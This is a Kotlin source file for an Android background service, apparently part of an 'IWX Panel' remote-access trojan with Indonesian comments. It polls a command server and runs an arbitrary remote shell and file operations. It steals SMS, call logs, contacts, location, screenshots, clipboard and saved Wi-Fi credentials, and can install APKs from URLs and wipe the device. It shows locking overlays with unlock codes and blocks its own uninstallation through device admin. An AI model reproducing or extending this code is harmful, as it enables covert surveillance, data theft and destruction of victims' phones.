package com.android.services

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.net.wifi.WifiManager
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import com.google.gson.JsonObject
import com.google.gson.JsonParser
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class ConnectorService : Service() {

    companion object {
        val SERVER_URL: String get() = SecureConfig.serverUrl()
        const val CHANNEL_ID = "connector_channel"
        const val NOTIF_ID = 1001
        const val ACTION_STOP = "ACTION_STOP"
        var isRunning = false
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(25, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .build()
    private val JSON = "application/json; charset=utf-8".toMediaType()
    private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }

    private var deviceId = ""
    private var deviceName = ""
    private var polling = false
    private var wakeLock: PowerManager.WakeLock? = null
    private var pollThread: Thread? = null

    // ── Persistent working directory for shell ─────────────────────────────
    @Volatile private var currentDir = "/sdcard"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) { stopSelf(); return START_NOT_STICKY }

        @Suppress("HardwareIds")
        val androidId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        )?.takeIf { it.isNotBlank() && it != "9774d56d682e549c" }

        deviceId = if (androidId != null) {
            androidId
        } else {
            val hw = "${Build.MANUFACTURER}:${Build.MODEL}:${Build.BOARD}:${Build.HARDWARE}"
            hw.hashCode().toString().replace("-", "x")
        }
        deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"

        // Guard: jangan restart polling jika sudah berjalan
        if (polling) {
            return START_STICKY
        }

        acquireWakeLock()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIF_ID, buildNotification("Connecting…", false),
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIF_ID, buildNotification("Connecting…", false))
        }
        isRunning = true
        currentDir = prefs.getString("shell_dir", "/sdcard") ?: "/sdcard"
        startPolling()
        DexModuleLoader.preloadAll(this)
        // FIX Bug 1: auto-enforce uninstall block setiap kali service start
        Thread { AppDeviceAdminReceiver.setBlockUninstall(this@ConnectorService, true) }
            .also { it.isDaemon = true }.start()
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        polling = false
        isRunning = false
        pollThread?.interrupt()
        wakeLock?.release()

        try {
            val pi = PendingIntent.getService(
                this, 99,
                Intent(this, ConnectorService::class.java),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_ONE_SHOT
            )
            (getSystemService(Context.ALARM_SERVICE) as AlarmManager)
                .setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 3000,
                    pi
                )
        } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ─────────────────────────────────────────
    //  POLLING LOOP
    // ─────────────────────────────────────────

    private fun startPolling() {
        polling = true
        pollThread = Thread {
            log("🟢 Started · Device: $deviceName")
            log("🆔 ID: $deviceId")
            var failCount = 0
            var lastHeartbeatAt = 0L
            while (polling) {
                try {
                    val now = System.currentTimeMillis()
                    if (now - lastHeartbeatAt >= 5000L) {
                        sendHeartbeat()
                        lastHeartbeatAt = now
                    }
                    val cmd = pollCommand()
                    if (cmd != null) {
                        log("📥 CMD: ${cmd.command}")
                        val (result, type) = executeCommand(cmd.command, cmd.extra)
                        sendResult(cmd.id, cmd.command, result, type)
                    }
                    failCount = 0
                } catch (e: InterruptedException) {
                    break
                } catch (e: Exception) {
                    failCount++
                    log("⚠️ ${e.message}")
                    if (failCount > 5) updateNotification("Server unreachable…", false)
                }
                try { Thread.sleep(500) } catch (e: InterruptedException) { break }
            }
        }.also { it.isDaemon = true; it.start() }
    }

    // ─────────────────────────────────────────
    //  HEARTBEAT
    // ─────────────────────────────────────────

    private fun sendHeartbeat() {
        val deviceJson = DeviceInfo.collect(this)
        val body = JsonObject().apply {
            addProperty("deviceId", deviceId)
            addProperty("deviceName", deviceName)
            add("device", deviceJson)
        }
        post("$SERVER_URL${ObfStr.apiHeartbeat()}", body.toString())
        updateNotification("Connected · $deviceName", true)
    }

    // ─────────────────────────────────────────
    //  POLL
    // ─────────────────────────────────────────

    private data class PendingCmd(val id: String, val command: String, val extra: String?)

    private fun pollCommand(): PendingCmd? {
        val resp = get("$SERVER_URL${ObfStr.apiPoll()}$deviceId") ?: return null
        val json = JsonParser.parseString(resp).asJsonObject
        val command = if (json.has("command") && !json.get("command").isJsonNull)
            json.get("command").asString else return null
        val cmdId = if (json.has("commandId") && !json.get("commandId").isJsonNull)
            json.get("commandId").asString else ""
        val extra = if (json.has("extra") && !json.get("extra").isJsonNull)
            json.get("extra").asString else null
        return PendingCmd(cmdId, command, extra)
    }

    // ─────────────────────────────────────────
    //  COMMAND DISPATCH
    // ─────────────────────────────────────────

    private fun executeCommand(cmd: String, extra: String?): Pair<String, String> {
        return when {
            // ── File Operations ──
            cmd.startsWith("ls_json:")   -> { val (t, r) = FileOperations.listDir(cmd.removePrefix("ls_json:")); Pair(r, t) }
            cmd.startsWith("read_b64:")  -> Pair(FileOperations.readFileBase64(cmd.removePrefix("read_b64:")), "command_result")
            cmd.startsWith("read_text:") -> Pair(FileOperations.readFileText(cmd.removePrefix("read_text:"), 500), "command_result")
            cmd.startsWith("thumb_b64:") -> {
                val parts = cmd.removePrefix("thumb_b64:").split(":")
                val path    = parts[0]
                val maxDim  = parts.getOrNull(1)?.toIntOrNull() ?: 200
                val quality = parts.getOrNull(2)?.toIntOrNull() ?: 55
                Pair(FileOperations.generateThumbnail(path, maxDim, quality), "command_result")
            }
            cmd.startsWith("write_b64:") -> Pair(if (extra == null) "ERROR: no data" else FileOperations.writeFileBase64(cmd.removePrefix("write_b64:"), extra), "command_result")
            cmd.startsWith("write_text:")-> Pair(if (extra == null) "ERROR: no content" else FileOperations.writeFileText(cmd.removePrefix("write_text:"), extra), "command_result")
            cmd.startsWith("mkdir:")     -> Pair(FileOperations.makeDir(cmd.removePrefix("mkdir:")), "command_result")
            cmd.startsWith("delete:")    -> Pair(FileOperations.deleteFile(cmd.removePrefix("delete:")), "command_result")
            cmd.startsWith("move:")      -> { val p = cmd.removePrefix("move:").split(":"); Pair(if (p.size < 2) "ERROR" else FileOperations.moveFile(p[0], p[1]), "command_result") }
            cmd.startsWith("file_info:") -> Pair(FileOperations.getFileInfo(cmd.removePrefix("file_info:")), "command_result")

            // ── Shell (stateful — cd persists across commands) ──
            cmd.startsWith("shell:")     -> Pair(handleShellCommand(cmd.removePrefix("shell:")), "command_result")

            // ── Package Manager (via shell) ──
            cmd.startsWith("pm_grant:")     -> { val p = cmd.removePrefix("pm_grant:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm grant ${p[0]} ${p[1]}"), "command_result") }
            cmd.startsWith("pm_revoke:")    -> { val p = cmd.removePrefix("pm_revoke:").split(":"); Pair(if (p.size < 2) "ERROR" else runShell("pm revoke ${p[0]} ${p[1]}"), "command_result") }
            cmd.startsWith("pm_uninstall:") -> Pair(runShell("pm uninstall ${cmd.removePrefix("pm_uninstall:").trim()}"), "command_result")
            cmd.startsWith("settings_put:") -> { val p = cmd.removePrefix("settings_put:").split(":", limit=3); Pair(if (p.size < 3) "ERROR" else runShell("settings put ${p[0]} ${p[1]} ${p[2]}"), "command_result") }
            cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShell("settings get ${p[0]} ${p[1]}"), "command_result") }

            // ── Location (dex module) ──
            cmd == "get_location"        -> DexModuleLoader.execute(this, "spy-location", cmd, null)

            // ── Call log (dex module) ──
            cmd.startsWith("get_sms")     -> DexModuleLoader.execute(this, "spy-sms", cmd, null)
            cmd.startsWith("get_calls")  -> DexModuleLoader.execute(this, "spy-calls", cmd, null)

            // ── Contacts (dex module) ──
            cmd.startsWith("get_contacts") -> DexModuleLoader.execute(this, "spy-contacts", cmd, null)

            // ── Installed apps ──
            cmd == "get_apps" || cmd.startsWith("pm_list") -> Pair(getInstalledApps(), "command_result")

            // ── Ring device ──
            cmd == "ring_device"         -> Pair(ringDevice(), "command_result")
            cmd == "stop_ring"           -> Pair(stopRing(), "command_result")

            // ── WiFi ──
            cmd == "scan_wifi"           -> Pair(scanWifi(), "command_result")
            cmd == "get_wifi_saved"      -> Pair(getWifiSaved(), "command_result")

            // ── Processes ──
            cmd == "get_processes"       -> Pair(runShell("ps -A"), "command_result")

            // ── Device control ──
            cmd == "wake_screen"         -> Pair(wakeScreen(), "command_result")
            cmd == "lock_screen"         -> Pair(lockScreen(), "command_result")
            cmd == "wipe_device"         -> Pair(wipeDevice(), "command_result")
            cmd.startsWith("vibrate:")   -> Pair(vibrateCustom(cmd.removePrefix("vibrate:").toIntOrNull() ?: 1), "command_result")
            cmd == "send_notification"   -> Pair(sendCustomNotification(extra), "command_result")
            cmd == "get_clipboard"       -> Pair(getClipboard(), "command_result")
            cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")

            // ── Screenshot (dex module) ──
            cmd.startsWith("screenshot") -> DexModuleLoader.execute(this, "spy-media", cmd, null)

            // ── Misc ──
            cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
            cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", "command_result")

            // ── Screen Inject ──
            cmd.startsWith("screen_inject_hacker:")   -> {
                val raw  = cmd.removePrefix("screen_inject_hacker:")
                val spd  = Regex("\\|\\|spd:([0-9.]+)").find(raw)?.groupValues?.getOrNull(1)?.toFloatOrNull() ?: 0.60f
                val txt  = raw.replace(Regex("\\|\\|spd:[0-9.]+"), "")
                Pair(doScreenInject(txt, "hacker", spd), "command_result")
            }
            cmd.startsWith("screen_inject_matrix:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_matrix:"),   "matrix"),   "command_result")
            cmd.startsWith("screen_inject_terminal:") -> Pair(doScreenInject(cmd.removePrefix("screen_inject_terminal:"), "terminal"), "command_result")
            cmd.startsWith("screen_inject_glitch:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_glitch:"),   "glitch"),   "command_result")
            cmd.startsWith("screen_inject:")          -> Pair(doScreenInject(cmd.removePrefix("screen_inject:"),          "hacker"),   "command_result")
            cmd == "screen_inject_stop"               -> Pair(doScreenInjectStop(), "command_result")
            cmd.startsWith("screen_inject_set_code:")  -> Pair(doSetUnlockCode(cmd.removePrefix("screen_inject_set_code:")), "command_result")
            cmd == "screen_inject_reset_code"           -> Pair(doResetUnlockCode(), "command_result")

            // ── Block/Unblock Uninstall (Device Admin/Owner) ──
            cmd.startsWith("block_uninstall:") -> Pair(AppDeviceAdminReceiver.setBlockUninstall(this, cmd.removePrefix("block_uninstall:").trim() == "true"), "command_result")

            // ── Self-Destruct: matikan guard + hapus admin + uninstall ──
            // RAHASIA — hanya operator panel yang bisa kirim command ini
            cmd == "self_destruct"  -> Pair(doSelfDestruct(), "command_result")

            cmd == "modules_reload"         -> { DexModuleLoader.invalidate(); DexModuleLoader.preloadAll(this); Pair("✅ Modules reloading…", "command_result") }

            else -> Pair("ERROR: Unknown command: $cmd", "command_result")
        }
    }






    // ─────────────────────────────────────────
    //  INSTALLED APPS
    // ─────────────────────────────────────────

    private fun getInstalledApps(): String {
        return try {
            val pm = packageManager
            val all = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            val user = all.filter { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
                .sortedBy { pm.getApplicationLabel(it).toString().lowercase() }
            val sb = StringBuilder("=== Installed Apps (${user.size}) ===\n")
            user.forEach { app ->
                val label = pm.getApplicationLabel(app).toString()
                val ver   = try { pm.getPackageInfo(app.packageName, 0).versionName ?: "?" } catch (_: Exception) { "?" }
                sb.appendLine("$label | ${app.packageName} | v$ver")
            }
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  RING DEVICE
    // ─────────────────────────────────────────

    private var ringtone: android.media.Ringtone? = null

    private fun ringDevice(): String {
        return try {
            val vib = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val pat = longArrayOf(0, 800, 400, 800, 400, 800, 400, 800)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vib.vibrate(android.os.VibrationEffect.createWaveform(pat, -1))
            } else {
                @Suppress("DEPRECATION") vib.vibrate(pat, -1)
            }
            try {
                ringtone?.stop()
                val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
                ringtone = android.media.RingtoneManager.getRingtone(this, uri)
                ringtone?.play()
                Thread { Thread.sleep(10000); ringtone?.stop() }.start()
            } catch (_: Exception) {}
            "🔊 Device is ringing!"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun stopRing(): String {
        return try {
            ringtone?.stop()
            (getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator).cancel()
            "🔇 Ring stopped"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    // ─────────────────────────────────────────
    //  WIFI
    // ─────────────────────────────────────────

    @SuppressLint("MissingPermission")
    private fun scanWifi(): String {
        return try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val results = wm.scanResults
            if (results.isEmpty()) return "⚠️ No WiFi networks found."
            buildString {
                appendLine("=== WiFi Networks (${results.size}) ===")
                results.sortedByDescending { it.level }.forEach { ap ->
                    val bars = WifiManager.calculateSignalLevel(ap.level, 5)
                    appendLine("${if (ap.SSID.isNullOrEmpty()) "[hidden]" else ap.SSID} | ${"▓".repeat(bars)}${"░".repeat(5-bars)} | ${ap.level}dBm")
                }
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    @SuppressLint("MissingPermission")
    private fun getWifiSaved(): String {
        return try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            val configs = wm.configuredNetworks
            if (configs.isNullOrEmpty()) return runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Permission denied'")
            buildString {
                appendLine("=== WiFi Tersimpan (${configs.size}) ===")
                configs.forEach { cfg -> appendLine("SSID: ${cfg.SSID?.replace("\"", "") ?: "?"}") }
            }
        } catch (e: Exception) { runShell("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'Butuh root'") }
    }

    // ─────────────────────────────────────────
    //  DEVICE CONTROL
    // ─────────────────────────────────────────

    private fun lockScreen(): String {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) { dpm.lockNow(); "🔒 Layar dikunci" }
            else "⚠️ Device Admin belum aktif."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun wakeScreen(): String {
        return try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            @Suppress("DEPRECATION")
            val wl = pm.newWakeLock(
                android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "IWXPanel:WakeScreen"
            )
            wl.acquire(3000L)
            wl.release()
            "\u2600\uFE0F Layar dinyalakan"
        } catch (e: Exception) { "Error: \${e.message}" }
    }

    private fun wipeDevice(): String {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = android.content.ComponentName(this, AppDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) { dpm.wipeData(0); "💀 Factory reset dimulai…" }
            else "⚠️ Device Admin belum aktif."
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun vibrateCustom(times: Int): String {
        return try {
            val vib = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            val n = times.coerceIn(1, 10)
            val pattern = LongArray(n * 2 + 1)
            pattern[0] = 0
            for (i in 1 until pattern.size step 2) { pattern[i] = 300; if (i + 1 < pattern.size) pattern[i + 1] = 200 }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) vib.vibrate(android.os.VibrationEffect.createWaveform(pattern, -1))
            else @Suppress("DEPRECATION") vib.vibrate(pattern, -1)
            "📳 Bergetar $n kali"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun sendCustomNotification(extra: String?): String {
        return try {
            val title: String; val text: String
            if (extra != null) {
                val json = JsonParser.parseString(extra).asJsonObject
                title = json.get("title")?.asString ?: "Pesan"; text = json.get("text")?.asString ?: ""
            } else { title = "Pesan dari Dashboard"; text = "" }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val notif = NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(title)
                .setContentText(text).setAutoCancel(true).build()
            nm.notify((System.currentTimeMillis() % 10000).toInt(), notif)
            "📢 Notifikasi terkirim: \"$title\""
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    @android.annotation.SuppressLint("ServiceCast")
    private fun getClipboard(): String {
        return try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = cm.primaryClip ?: return "📋 Clipboard kosong"
            "📋 Clipboard:\n${clip.getItemAt(0).coerceToText(this)}"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    private fun installApk(url: String): String {
        return try {
            val file = java.io.File(getExternalFilesDir(null), "install_${System.currentTimeMillis()}.apk")
            http.newCall(Request.Builder().url(url).build()).execute().use { resp ->
                if (!resp.isSuccessful) return "Error: HTTP ${resp.code}"
                resp.body?.byteStream()?.use { input -> file.outputStream().use { output -> input.copyTo(output) } }
            }
            val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
                androidx.core.content.FileProvider.getUriForFile(this, "$packageName.fileprovider", file)
            else android.net.Uri.fromFile(file)
            startActivity(Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            })
            "📦 APK instalasi dimulai: ${file.name}"
        } catch (e: Exception) { "Error install APK: ${e.message}" }
    }


    // ─────────────────────────────────────────
    //  SHELL — full stateful terminal
    // ─────────────────────────────────────────

    /**
     * Entry point for all user shell commands.
     * Handles "cd" specially so the working directory persists across commands.
     * Every response includes a "[dir:/path]" trailer so the dashboard can show
     * the current prompt path.
     */
    private fun handleShellCommand(rawCmd: String): String {
        val trimmed = rawCmd.trim()

        return when {
            // ── cd (no arg, ~, or / → home) ───────────────────────────────
            trimmed == "cd" || trimmed == "cd ~" || trimmed == "cd ~/" || trimmed == "cd /" -> {
                currentDir = if (trimmed == "cd /") "/" else "/sdcard"
                saveShellDir()
                "[dir:$currentDir]"
            }

            // ── cd - (previous dir — not tracked, just report) ────────────
            trimmed == "cd -" -> "cd: OLDPWD not set\n[dir:$currentDir]"

            // ── cd <target> ────────────────────────────────────────────────
            trimmed.startsWith("cd ") -> {
                val arg = trimmed.removePrefix("cd ").trim()
                    .replace("~", "/sdcard")
                val resolved = resolveShellPath(arg)
                // Verify the resolved path is a real directory on device
                val check = rawExec("test -d \"$resolved\" && echo OK || echo FAIL", currentDir, 5)
                if (check.trim() == "OK") {
                    currentDir = resolved
                    saveShellDir()
                    "[dir:$currentDir]"
                } else {
                    // Fallback: jika path absolut tidak ditemukan, coba di bawah /sdcard.
                    // Contoh: "cd /Documents" → coba "/sdcard/Documents".
                    // Ini menangani kebiasaan pengguna yang mengetik path ala Linux
                    // padahal di Android storage ada di /sdcard.
                    val fallback = if (arg.startsWith("/") && !arg.startsWith("/sdcard")) {
                        resolveShellPath("/sdcard$arg")
                    } else null
                    val fallbackOk = fallback != null &&
                        rawExec("test -d \"$fallback\" && echo OK || echo FAIL", currentDir, 5).trim() == "OK"
                    if (fallbackOk && fallback != null) {
                        currentDir = fallback
                        saveShellDir()
                        "[dir:$currentDir]"
                    } else {
                        "cd: $arg: No such file or directory\n[dir:$currentDir]"
                    }
                }
            }

            // ── pwd — return current dir ───────────────────────────────────
            trimmed == "pwd" -> "$currentDir\n[dir:$currentDir]"

            // ── All other commands — run inside currentDir ─────────────────
            else -> {
                val out = rawExec(trimmed, currentDir, 30)
                val body = out.trimEnd('\n')
                if (body == "(no output)") "[dir:$currentDir]"
                else "$body\n[dir:$currentDir]"
            }
        }
    }

    /** Resolve a shell path relative to [baseDir]. */
    private fun resolveShellPath(target: String): String {
        val base = if (target.startsWith("/")) "/" else currentDir
        val parts = (if (target.startsWith("/")) "" else base)
            .split("/")
            .toMutableList()
        target.trimEnd('/').split("/").forEach { seg ->
            when (seg) {
                "", "." -> {}
                ".."    -> if (parts.size > 1) parts.removeAt(parts.lastIndex)
                else    -> parts.add(seg)
            }
        }
        val result = parts.joinToString("/").ifEmpty { "/" }
        return if (result.length > 1) result.trimEnd('/') else result
    }

    private fun saveShellDir() {
        prefs.edit().putString("shell_dir", currentDir).apply()
    }

    /**
     * Execute [cmd] as "sh -c" with CWD = [dir].
     * stdout and stderr are read concurrently to avoid pipe-buffer deadlock.
     * Killed after [timeoutSec] seconds.
     */
    private fun rawExec(cmd: String, dir: String, timeoutSec: Long = 30): String {
        return try {
            val proc = ProcessBuilder("sh", "-c",
                    "cd \"$dir\" 2>/dev/null || cd /sdcard; $cmd")
                .redirectErrorStream(false)
                .start()
            proc.outputStream.close()   // no stdin

            var stdout = ""
            var stderr = ""
            val tOut = Thread { stdout = proc.inputStream.bufferedReader(Charsets.UTF_8).readText() }
            val tErr = Thread { stderr = proc.errorStream.bufferedReader(Charsets.UTF_8).readText() }
            tOut.isDaemon = true; tErr.isDaemon = true
            tOut.start(); tErr.start()

            val exited = proc.waitFor(timeoutSec, TimeUnit.SECONDS)
            if (!exited) {
                proc.destroyForcibly()
                tOut.join(500); tErr.join(500)
                return "ERROR: command timed out after ${timeoutSec}s"
            }
            tOut.join(2000); tErr.join(2000)

            buildString {
                if (stdout.isNotEmpty()) append(stdout.trimEnd('\n'))
                if (stderr.isNotEmpty()) {
                    if (stdout.isNotEmpty()) append("\n")
                    append(stderr.trimEnd('\n'))
                }
            }.ifEmpty { "(no output)" }
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    /** Legacy helper used internally (pm, settings, screencap, etc.). */
    private fun runShell(cmd: String, timeoutSec: Long = 15): String =
        rawExec(cmd, currentDir, timeoutSec)

    // ─────────────────────────────────────────
    //  SEND RESULT
    // ─────────────────────────────────────────

    private fun sendResult(commandId: String, command: String, result: String, type: String) {
        val body = JsonObject().apply {
            addProperty("deviceId", deviceId)
            addProperty("commandId", commandId)
            addProperty("command", command)
            addProperty("result", result)
            addProperty("exitCode", 0)
            addProperty("type", type)
            if (type == "file_listing") {
                try { add("data", JsonParser.parseString(result).asJsonObject) } catch (_: Exception) {}
            }
        }
        post("$SERVER_URL${ObfStr.apiResult()}", body.toString())
    }

    // ─────────────────────────────────────────
    //  HTTP
    // ─────────────────────────────────────────

    private fun post(url: String, json: String): String? = try {
        http.newCall(Request.Builder().url(url).post(json.toRequestBody(JSON)).build())
            .execute().use { it.body?.string() }
    } catch (_: Exception) { null }

    private fun get(url: String): String? = try {
        http.newCall(Request.Builder().url(url).get().build()).execute().use { it.body?.string() }
    } catch (_: Exception) { null }

    // ─────────────────────────────────────────
    //  NOTIFICATION
    // ─────────────────────────────────────────

    private fun createNotificationChannel() {
        val chan = NotificationChannel(CHANNEL_ID, getString(R.string.channel_name), NotificationManager.IMPORTANCE_LOW)
            .apply { description = getString(R.string.channel_desc); setShowBadge(false) }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
    }

    private fun buildNotification(status: String, connected: Boolean): Notification {
        val stop = PendingIntent.getService(this, 0,
            Intent(this, ConnectorService::class.java).apply { action = ACTION_STOP },
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        val open = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_share)
            .setContentTitle("IWX Panel ${if (connected) "🟢" else "🔴"}")
            .setContentText(status)
            .setContentIntent(open)
            .addAction(android.R.drawable.ic_delete, "Stop", stop)
            .setOngoing(true).setSilent(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun updateNotification(status: String, connected: Boolean) {
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .notify(NOTIF_ID, buildNotification(status, connected))
    }

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "IWXPanel:WakeLock")
            .apply { acquire(24 * 60 * 60 * 1000L) }
    }

    // ── Screen Inject ─────────────────────────────────────────────────────────
    private fun doScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f): String {
        return try {
            val trimmed = text.trim().ifEmpty { "By IWX TEAM" }
            KeyloggerService.showScreenInject(trimmed, style, speed)
            "OK: [${style.uppercase()}] Overlay — ${trimmed}"
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    private fun doScreenInjectStop(): String {
        return try {
            KeyloggerService.hideScreenInject()
            "OK: Overlay dihapus"
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    private fun doSetUnlockCode(code: String): String {
        val c = code.trim().filter { it.isLetterOrDigit() }.take(12)
        return if (c.length >= 2) {
            KeyloggerService.unlockCode = c
            "OK: Unlock code set to [$c]"
        } else "ERROR: Code too short — min 2 chars"
    }

    private fun doResetUnlockCode(): String {
        KeyloggerService.resetUnlockCode()
        return "OK: Unlock code reset to [2719]"
    }

    private fun log(msg: String) {
        android.util.Log.d("ConnectorService", msg)
    }

    // ── Auto-Grant via AccessibilityService ───────────────────────────────────
    // ─────────────────────────────────────────
    //  SELF-DESTRUCT  (owner-only backdoor)
    // ─────────────────────────────────────────

    /**
     * Matikan semua proteksi anti-uninstall lalu launch uninstall dialog.
     * Hanya bisa dipanggil via remote command dari panel — tidak ada UI-nya.
     *
     * Urutan:
     *   1. Nonaktifkan guard halaman Device Admin (KeyloggerService flag)
     *   2. Lepas setUninstallBlocked
     *   3. Lepas Device Owner (jika aktif)
     *   4. Lepas Device Admin
     *   5. Launch ACTION_DELETE intent → uninstall dialog normal
     */
    private fun doSelfDestruct(): String {
        return try {
            // 1. Matikan guard AccessibilityService
            KeyloggerService.adminGuardEnabled = false

            val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val admin = AppDeviceAdminReceiver.getComponentName(this)

            // 2. Lepas setUninstallBlocked
            try { dpm.setUninstallBlocked(admin, packageName, false) } catch (_: Exception) {}

            // 3. Lepas User Restrictions jika Device Owner
            if (dpm.isDeviceOwnerApp(packageName)) {
                try { dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_UNINSTALL_APPS) } catch (_: Exception) {}
                try { dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_SAFE_BOOT) } catch (_: Exception) {}
                try { dpm.clearDeviceOwnerApp(packageName) } catch (_: Exception) {}
            }

            // 4. Lepas Device Admin
            try { dpm.removeActiveAdmin(admin) } catch (_: Exception) {}

            // 5. Launch uninstall dialog (sekarang bisa karena admin sudah lepas)
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try {
                    val uri = android.net.Uri.parse("package:$packageName")
                    startActivity(android.content.Intent(android.content.Intent.ACTION_DELETE, uri).apply {
                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    })
                } catch (_: Exception) {}
            }, 800)

            polling = false
            stopSelf()
            "✅ Self-destruct initiated — admin removed, uninstall dialog launching"
        } catch (e: Exception) {
            "ERROR: ${e.message}"
        }
    }


}
